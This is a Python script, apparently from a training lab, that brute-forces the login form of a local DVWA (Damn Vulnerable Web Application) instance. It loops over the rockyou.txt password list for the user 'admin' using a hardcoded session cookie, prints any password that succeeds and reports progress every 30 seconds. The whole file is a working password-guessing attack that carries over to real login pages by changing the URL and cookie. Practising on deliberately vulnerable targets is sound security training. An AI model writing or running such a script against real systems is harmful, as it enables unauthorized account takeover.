import requests
import time

dict_file = '/home/dojo/Desktop/rockyou.txt'
u_name_list = ['admin']
headers = {'Cookie':'security=low; PHPSESSID=raierlhcspe66pksiebmcc26gf','Referer':'http://localhost/DVWA/index.php'}

def get_http(u_name, p_word):
    url = "http://localhost/dvwa/vulnerabilities/brute/"
    params = {'username': u_name, 'password': p_word, 'Login': 'Login'}
    req = requests.get(url, headers=headers, params=params)
    return url, req.status_code, req.text

print('Starting bruteforce')
total_lines = sum(1 for line in open(dict_file))
lines_analyzed = 0

start_time = time.time()
for u_name in u_name_list:
    f = open(dict_file, 'r')
    for line in f:
        p_word = line.strip()
        url, status_code, result = get_http(u_name, p_word)
        if result.find('incorrect') == -1:
            print('Login: ' + u_name + ', password: ' + p_word)
        lines_analyzed += 1

        elapsed_time = time.time() - start_time
        if elapsed_time >= 30:
            percentage_analyzed = (lines_analyzed / total_lines) * 100
            print(f'{percentage_analyzed:.2f}% of the file analyzed')
            start_time = time.time()

    f.close()